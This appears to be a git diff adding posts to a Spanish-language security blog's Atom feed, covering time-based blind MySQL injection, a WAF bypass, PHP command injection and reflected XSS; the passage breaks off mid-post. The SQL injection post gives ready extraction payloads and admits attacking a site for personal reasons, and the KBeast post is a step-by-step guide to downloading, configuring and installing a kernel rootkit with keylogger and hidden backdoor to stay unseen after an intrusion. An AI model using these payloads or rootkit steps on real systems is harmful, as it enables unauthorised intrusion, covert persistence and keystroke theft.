@@ -4,7 +4,7 @@
   <title><![CDATA[Security]]></title>
   <link href="http://q3rv0.github.io/atom.xml" rel="self"/>
   <link href="http://q3rv0.github.io/"/>
-  <updated>2014-11-17T08:23:13+06:30</updated>
+  <updated>2014-11-17T10:52:30+06:30</updated>
   <id>http://q3rv0.github.io/</id>
   <author>
     <name><![CDATA[q3rv0]]></name>
@@ -12,6 +12,743 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Blind Mysqli Time Based [Teoria]]]></title>
+    <link href="http://q3rv0.github.io/blog/2014/11/17/blind-mysqli-time-based-teoria/"/>
+    <updated>2014-11-17T10:42:51+06:30</updated>
+    <id>http://q3rv0.github.io/blog/2014/11/17/blind-mysqli-time-based-teoria</id>
+    <content type="html"><![CDATA[<p>Mientras “auditaba” una web, lo digo entre comillas por que no me dedico a eso en lo laboral, mas bien me encontraba tratando de ingresar a un sitio por cuestiones personales, me encontre con una variante de inyeccion sql dando por descartado las demas a travez de las respuestas que generaba el servidor, una “Blind mysqli basada en tiempo”,<!--more--> paso a explicar a quienes no se encuntren familiarizados con este tipo de inyeccion.
+Basicamente una “Blind mysqli basada en tiempo” se trata de inyectar a ciegas como toda blind, en mi caso utilizando la tecnica de busqueda binaria (la mas comunmente utilizada en estas situaciones) pero se da cuando la aplicacion muestra el mismo mensaje TRUE OR FALSE, es decir que da los mismo inyectar un OR 1=1 que un OR 2+5/87=9999999999 el sitio web nos seguira mostrando el mismo mensaje de error, o puede deberse a realizar una carga incorrecta del contenido web, o cualquier otra desvariacion en el sitio, da lo mismo la aplicacion resulta vulnerable pero no podremos deducir cual es la inyeccion correcta.
+Para estas situaciones, podemos hacer uso de la funcion sleep() y la estructura condicional if(), ahora paso a explicar la sintaxis de cada una de estas.</p>
+
+<p>La sintaxis de if es la siguiente:</p>
+
+<p>if(&ldquo;condicion&rdquo;,&ldquo;si la condicion se cumple&rdquo;,&ldquo;si la condicion no se cumple&rdquo;)</p>
+
+<p>Por ejemplo:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;Verdadero es igual!&#39;</span><span class="p">,</span> <span class="s1">&#39;Falso no es igual!&#39;</span><span class="p">);</span>
+</span><span class='line'><span class="o">+------------------------------------------------------+</span>
+</span><span class='line'><span class="o">|</span> <span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;Verdadero es igual!&#39;</span><span class="p">,</span> <span class="s1">&#39;Falso no es igual!&#39;</span><span class="p">)</span> <span class="o">|</span>
+</span><span class='line'><span class="o">+------------------------------------------------------+</span>
+</span><span class='line'><span class="o">|</span> <span class="n">Verdadero</span> <span class="n">es</span> <span class="n">igual</span><span class="o">!</span>                                  <span class="o">|</span>
+</span><span class='line'><span class="o">+------------------------------------------------------+</span>
+</span><span class='line'><span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>sleep() se utiliza para producir una pausa de tantos segundos, vamos a combinarlo con if() e imponerlo si la condicion no se cumple.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="s1">&#39;q3rv0&#39;</span><span class="p">,</span> <span class="s1">&#39;Verdadero es igual!&#39;</span><span class="p">,</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">));</span>
+</span><span class='line'><span class="o">+------------------------------------------------+</span>
+</span><span class='line'><span class="o">|</span> <span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="s1">&#39;q3rv0&#39;</span><span class="p">,</span> <span class="s1">&#39;Verdadero es igual!&#39;</span><span class="p">,</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span> <span class="o">|</span>
+</span><span class='line'><span class="o">+------------------------------------------------+</span>
+</span><span class='line'><span class="o">|</span> <span class="mi">0</span>                                              <span class="o">|</span>
+</span><span class='line'><span class="o">+------------------------------------------------+</span>
+</span><span class='line'><span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span><span class="p">,</span> <span class="mi">1</span> <span class="nf">warning</span> <span class="p">(</span><span class="mi">3</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Como vemos la condicion dio como resultado falsa y se le introdujo un retardo de 3 seg ante dicha respuesta.</p>
+
+<p>ahora se pueden imaginar el resultado del vector al combinar ambas funciones con una blind sqli??</p>
+
+<p>No se trata de nada rebuscado, solo hay que utilizar como condicion el vector sqli para dicha inyeccion por ejemplo:</p>
+
+<p>Empezemos desde cero, supongamos que encontraron una web vulnerable que da con el perfil de este tipo de inyeccion y queremos verificar que en realidad se trata de esta, comenzariamos por introcir el siguiente vector en el parametro devil.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://vuln-bsqli-based-time/?devil=5 or 1=if(1=1,sleep(5),0)--   > 5 segundos(TRUE)
+</span><span class='line'> 
+</span><span class='line'>http://vuln-bsqli-based-time/?devil=5 or 1=if(1=9999,sleep(5),0)--  > FALSE</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ahora ya nos damos una idea de como inyectar en la aplicacion comenzando por obtener el listado de las tablas en la base de datos, normalmente en una blind sqli seria de la siguiente manera:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>15-- TRUE
+</span><span class='line'> 
+</span><span class='line'>http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>50-- TRUE
+</span><span class='line'> 
+</span><span class='line'>http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>100-- FALSE
+</span><span class='line'> 
+</span><span class='line'>http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>68-- FALSE
+</span><span class='line'> 
+</span><span class='line'>http://vuln-bsqli/?devil=5 or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))=67-- TRUE</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Veamos como queda armado el vector haciendo uso de nuestro amigo “el tiempo”:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>15,sleep(5),0)-- TRUE 5 segundos
+</span><span class='line'> 
+</span><span class='line'>http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>50,sleep(5),0)-- TRUE 5 segundos
+</span><span class='line'> 
+</span><span class='line'>http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>100,sleep(5),0)-- FALSE
+</span><span class='line'> 
+</span><span class='line'>http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))>68,sleep(5),0)-- FALSE
+</span><span class='line'> 
+</span><span class='line'>http://vuln-bsqli-based-time/?devil=5 or 1=if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))=67,sleep(5),0)-- TRUE 5 segundos</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Sencillo, lo unico que tiene de rebuscado esta tecnica es mantener la paciencia mienstras se lleva a cabo la inyeccion manualmente.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[SQLI+Mod_Security Bypass]]></title>
+    <link href="http://q3rv0.github.io/blog/2014/11/17/sqli-plus-mod-security-bypass/"/>
+    <updated>2014-11-17T10:37:16+06:30</updated>
+    <id>http://q3rv0.github.io/blog/2014/11/17/sqli-plus-mod-security-bypass</id>
+    <content type="html"><![CDATA[<p>Indagando en busca de vulnerabilidades, me cruzo con un input mal validado el cual esta siendo filtrado por un WAF, posiblemente Mod_security, bastante mal configurado, en el video se puede ver como realize una simple evacion de este a <!--more-->travez de /<em>!</em>/ y funciones como unhex(), hex() espero que lo disfruten!</p>
+
+<div class="embed-video-container"><iframe src="//player.vimeo.com/video/55140992"></iframe></div>
+
+
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[[KBEAST] Plantando Un Rootkit]]></title>
+    <link href="http://q3rv0.github.io/blog/2014/11/17/kbeast-plantando-un-rootkit/"/>
+    <updated>2014-11-17T10:19:05+06:30</updated>
+    <id>http://q3rv0.github.io/blog/2014/11/17/kbeast-plantando-un-rootkit</id>
+    <content type="html"><![CDATA[<p>Siempre es conveniente asegurarse el silencio luego de una intrusion, y con que me refiero al silencio? Ademas de entrar en el tema de borrado de huellas, me refiero a la accion de dejar un secuas en el servidor que se encargue de ocultar ciertos procesos, archivos, etc que dejemos en el target para esto voy a utilizar a KBeast que es un rootkit 2011, ademas de uno de mis preferidos, tiene soporte para los kernel 2.6.18 y 2.6.32,y presenta varias funcionalidades interesantes como:</p>
+
+<p>-Ocultar archivos y directorios</p>
+
+<p>-Ocultar procesos de (ps, pstree, top, lsof)</p>
+
+<p>– Ocultar puertos locales abiertos (backdoors)</p>
+
+<p>-Viene con un modulo keylogger incorporado para capturar las pulsaciones.</p>
+
+<p>-Anti-kill para procesos</p>
+
+<!--more-->
+
+
+<p>-Anti-remove para archivos</p>
+
+<p>-Trae un backdoor bind incorporado</p>
+
+<p>– Tambien se encarga de esconder ciertos modulos cargando en el kernel ademas de un anti-remove para estos.</p>
+
+<p>Bastante completita la basura!, demas esta decir que requerimos de privilegios de usuario root, en este caso lo voy a realizar en un debian con un kernel 2.6.32 (entorno controlado)</p>
+
+<p>Descargamos el rootkit.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>wget http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/GZ4hh.png"></p>
+
+<p>Una vez extraido nos encontramos con varios files, tendremos que editar a nuestro antojo el archivo de configuracion config.h</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/*
+</span><span class='line'>Kernel Beast Ver #1.0 - Configuration File
+</span><span class='line'>Copyright Ph03n1X of IPSECS (c) 2011
+</span><span class='line'>Get more research of ours http://ipsecs.com
+</span><span class='line'>*/
+</span><span class='line'> 
+</span><span class='line'>/*Don't change this line*/
+</span><span class='line'>#define TRUE 1
+</span><span class='line'>#define FALSE 0
+</span><span class='line'> 
+</span><span class='line'>/*
+</span><span class='line'>Enable keylog probably makes the system unstable
+</span><span class='line'>But worth to be tried
+</span><span class='line'>*/
+</span><span class='line'>#define _KEYLOG_ TRUE
+</span><span class='line'> 
+</span><span class='line'>/*Define your module &amp; network daemon name*/
+</span><span class='line'>#define KBEAST "kbeast"
+</span><span class='line'> 
+</span><span class='line'>/*
+</span><span class='line'>All files, dirs, process will be hidden
+</span><span class='line'>Protected from deletion &amp; being killed
+</span><span class='line'>*/
+</span><span class='line'>#define _H4X0R_ "_h4x_"
+</span><span class='line'> 
+</span><span class='line'>/*
+</span><span class='line'>Directory where your rootkit will be saved
+</span><span class='line'>You have to use _H4X0R_ in your directory name
+</span><span class='line'>No slash (/) at the end
+</span><span class='line'>*/
+</span><span class='line'>#define _H4X_PATH_ "/usr/_h4x_"
+</span><span class='line'> 
+</span><span class='line'>/*
+</span><span class='line'>File to save key logged data
+</span><span class='line'>*/
+</span><span class='line'>#define _LOGFILE_ "acctlog"
+</span><span class='line'> 
+</span><span class='line'>/*
+</span><span class='line'>This port will be hidded from netstat
+</span><span class='line'>*/
+</span><span class='line'>#define _HIDE_PORT_ 13377
+</span><span class='line'> 
+</span><span class='line'>/*
+</span><span class='line'>Password for remote access
+</span><span class='line'>*/
+</span><span class='line'>#define _RPASSWORD_ "h4x3d"
+</span><span class='line'>#define _MAGIC_NAME_ "bin"
+</span><span class='line'>/*
+</span><span class='line'>Magic signal &amp; pid for local escalation
+</span><span class='line'>*/
+</span><span class='line'>#define _MAGIC_SIG_ 37 //kill signal
+</span><span class='line'>#define _MAGIC_PID_ 31337 //kill this pid</span></code></pre></td></tr></table></div></figure>
+
+
+<p>prosigo a explicar la funcion de cada linea en el fichero de configuracion.</p>
+
+<p>1- La primera linea la dejamos tal cual esta</p>
+
+<p>2- la segunda se encarga de activar el modulo keylogger del rootkit en caso contrario escribimos</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#define _KEYLOG_ FALSE</span></code></pre></td></tr></table></div></figure>
+
+
+<p>3- se encarga de darle el nombre al daemon rootkit</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#define KBEAST "q3rv0"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>4 – En esta linea vamos a incluir los ficheros y directorios que queremos que sean protegidos por el anti-remove.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#define _H4X0R_ "/home/q3rv0/protect/q3rv0.txt"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>5- Define el directorio donde se guardara KBeast</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#define _H4X_PATH_ "/usr/share/kbeast"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>6 – Aca especificamos el nombre del fichero de log donde van a ir a parar las pulsasiones capturadas por el keylogger</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#define _LOGFILE_ "acctlog"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>7- El puerto que estara hide a la vista de los comandos anteriormente mencionados.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#define _HIDE_PORT_ 6666</span></code></pre></td></tr></table></div></figure>
+
+
+<p>8- Incluimos el password para el acceso con el backdoor.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#define _RPASSWORD_ "q3rv0"
+</span><span class='line'>#define _MAGIC_NAME_ "bin"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Habiendo terminado de configurar el ficherito, que bastante intuitivo es, si me saltee la 9, pero esa la dejo tal cual esta.</p>
+
+<p>Procedemos a lanzar el rootkit de la siguiente manera.</p>
+
+<p>En los kernel 2.6.18</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>./setup buil 0
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>En los 2.6.32 como es mi caso</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>./setup build
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/hw6x4.png"></p>
+
+<p>Vemos que se compilo exitosamente en el nucleo sin ningun error, ahora vamos a comprobar si cumple con nuestras espectativas.</p>
+
+<p>-Verificando la proteccion anti-remove de ficheros</p>
+
+<p><img src="http://i.imgur.com/500HR.png"></p>
+
+<p>– Directorio donde se guarda el rootkit en el systema</p>
+
+<p><img src="http://i.imgur.com/VSJz7.png"></p>
+
+<p>– Pulsaciones capturadas por el modulo keylogger…
+El fichero de log se guarda en el directorio donde le indicamos que se guarde el rootkit.</p>
+
+<p><img src="http://i.imgur.com/GPSES.png"></p>
+
+<p>– Port 6666 Hide</p>
+
+<p><img src="http://i.imgur.com/xjczD.png"></p>
+
+<p>– Accediendo al sistema a travez del backdoor en el puerto 6666</p>
+
+<p><img src="http://i.imgur.com/ygqhy.png"></p>
+
+<p>– oka, para remover el rootkit del kernel solo basta realizar un:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>./setup clean
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/FwpY9.png"></p>
+
+<p>Espero que lo hayan disfrutado y cada vez que rooteen un server acuerdense de kbeast :)</p>
+
+<p>Saludos!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Remote Code Execution]]></title>
+    <link href="http://q3rv0.github.io/blog/2014/11/17/remote-code-execution/"/>
+    <updated>2014-11-17T10:04:38+06:30</updated>
+    <id>http://q3rv0.github.io/blog/2014/11/17/remote-code-execution</id>
+    <content type="html"><![CDATA[<p>La ejecucion remota de comandos, como su nombre lo dice, es una vulnerabilidad
+que nos permite inyectar ordenes remotamente en el sistema, basicamente se
+debe a un mal filtrado de variables que utilizan funciones como:<!--more--></p>
+
+<p>system()</p>
+
+<p>passthru()</p>
+
+<p>shell_exec()</p>
+
+<p>exec()</p>
+
+<p>ssh2_exec()</p>
+
+<p>Y demas funciones php que permiten la ejecucion de comandos en el OS.</p>
+
+<p>Hay ciertas webs, que utilizan scripts que se encargan de interactuar
+con los datos que el usuario provee en la aplicacion, muchos de ustedes
+seguramente habran echo uso de servicios de fingerprinting online, los cuales
+nos permiten utilizar comandos como whois, ping, dig, nslookup, etc</p>
+
+<p><img src="http://i.imgur.com/BFcGN.png"></p>
+
+<p>justamente de este tipo de webs hablo, si no se aplica una correcta seguridad en la aplicacion podria ser brutal para la misma, ya que cualquier usuario con conocimientos se podria aprovechar del mal filtro y lanzar comandos arbitrariamente en el sistema oporativo.</p>
+
+<p>En si la explotacion de este tipo de vulnerabilidad no conlleva una complicaion
+en cuanto al uso de vectores largos, salvo que en el servidor victima este
+corriendo mod_security o algun otro tipo de waf con sus respectivos filtros. La
+idea no es explicar a evadir los mismos, si no mostrar que tan sencillo es explotar esta tecnica.</p>
+
+<p>Vamos a ver un posible codigo vulnerable.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;boton-ping&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span><span class='line'>    <span class="nv">$objetivo</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;target&#39;</span><span class="p">];</span>
+</span><span class='line'>    <span class="k">echo</span> <span class="s2">&quot;&lt;pre class=”report-header”&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">&quot; nslookup &quot;</span> <span class="o">.</span><span class="nv">$objetivo</span><span class="p">);</span>
+</span><span class='line'>    <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Vemos como toma los valores del usuario a travez de POST, y luego ejecuta
+la entrada con nslookup, a todo esto, no hay una sola verificacion de variables, desp voy a explicar como se puede corregir el script.</p>
+
+<p>Como se puede aprovechar de la ineficiencia de un programador?</p>
+
+<p>Sencillamente, usando una | (tuberia pipe) o ; (actua como separador de comandos)</p>
+
+<p>Supongamos que quisieramos averiguar la version del kernel.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'> 
+</span><span class='line'>10.x.x.x<span class="p">|</span>uname -a
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>o</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>10.x.x.x <span class="p">;</span> uname -a
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>De esta manera el script quedaria sano y salvo a la entrada de comandos por parte de un atacante.
+El codigo se ejecutaria de la siguiente manera en el script.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>nslookup 10.x.x.x<span class="p">|</span>uname -a
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Lo cual terminaria imprimiendo la version del kernel.</p>
+
+<p>Sencillo no??.</p>
+
+<p>Como se puede corregir esta vulnerabilidad?</p>
+
+<p>– Validando la entrada de datos con funciones como escapeshellarg(), escapeshellcmd()</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;boton-ping&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span><span class='line'>    <span class="nv">$objetivo</span><span class="o">=</span><span class="nb">escapeshellcmd</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;target&#39;</span><span class="p">]);</span>
+</span><span class='line'>    <span class="k">echo</span> <span class="s2">&quot;&lt;pre class=”report-header”&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">&quot; nslookup &quot;</span> <span class="o">.</span><span class="nv">$objetivo</span><span class="p">);</span>
+</span><span class='line'>    <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>De esta manera el script quedaria sano y salvo a la entrada de comandos por parte de un atacante.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Xss a Travez De Error]]></title>
+    <link href="http://q3rv0.github.io/blog/2014/11/17/xss-a-travez-de-error/"/>
+    <updated>2014-11-17T10:00:33+06:30</updated>
+    <id>http://q3rv0.github.io/blog/2014/11/17/xss-a-travez-de-error</id>
+    <content type="html"><![CDATA[<p>No todos los errores del tipo mysql, mssql, postgresql, sqlite3, funciones como include(), main(), require(), require_once() , errores en scripts VBscripts, etc, tienen que ser suceptibles a rfi, lfi, sqli, etc. Hay ciertas ocaciones en que este tipo de mensajes no pueden ser aprovechados de manera satisfactoria, pero a travez del error se podria inyectar codigo javascript en el index.<!--more--></p>
+
+<p>Miremos un ejemplo de una web que al parecer es vulnerable a sqli.</p>
+
+<p><img src="http://i.imgur.com/RfYyt.png"></p>
+
+<p><img src="http://i.imgur.com/VHiNH.png"></p>
+
+<p>Como podemos divisar en el mensaje que nos devuelve la DB salta la cadena que acabo de inyectar en el parametro vulnerable.</p>
+
+<p>Probemos a ver si logramos ponerla en &ldquo;negrita&rdquo;</p>
+
+<p><img src="http://i.imgur.com/aKb4Y.png"></p>
+
+<p>Efectivamente inyectamos codigo html, a ver que pasa con un alert?.</p>
+
+<p><img src="http://i.imgur.com/Q2yYG.png"></p>
+
+<p>Como vemos todo error por parte del servidor que nos devuelva la cadena que introducimos en el parametro puede ser aprovechado para inyectar de manera reflejada un XSS, con o sin evasivas! ojala les haya servido!</p>
+
+<p>Bytes!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Jugando Con .htaccess]]></title>
+    <link href="http://q3rv0.github.io/blog/2014/11/17/jugando-con-htaccess/"/>
+    <updated>2014-11-17T09:27:30+06:30</updated>
+    <id>http://q3rv0.github.io/blog/2014/11/17/jugando-con-htaccess</id>
+    <content type="html"><![CDATA[<p>La mayoria ya conoce cual es la funcion de este archivo en el servidor encargandose de actuar sobre el fichero de configuracion de apache “httpd.conf”</p>
+
+<p>Permite:</p>
+
+<p>Redireccion de url’s</p>
+
+<p>Respuestas de error personalizadas.</p>
+
+<p>Proteccion de directorios, subdirectorios y ficheros en el servidor.</p>
+
+<p>Certificados de autentificacion http.</p>
+
+<p>etc…</p>
+
+<!--more-->
+
+
+<p>No vengo a escribrir de como implementar cada una de sus funciones.</p>
+
+<p>En la Black-Hat pasada se hablo de una supuesta vulnerabilidad en .htaccess, yo creo que mas que una vulnerabilidad es solo una mala implementacion del metodo &ldquo;Limit&rdquo; cuando se desea restringir el acceso a cierto directorio/fichero presentando un certificado de autentificacion http.</p>
+
+<p>En cuanto a estos tipos de certificados tenemos los:</p>
+
+<p>Basicos: La contraseña viaja en texto plano</p>
+
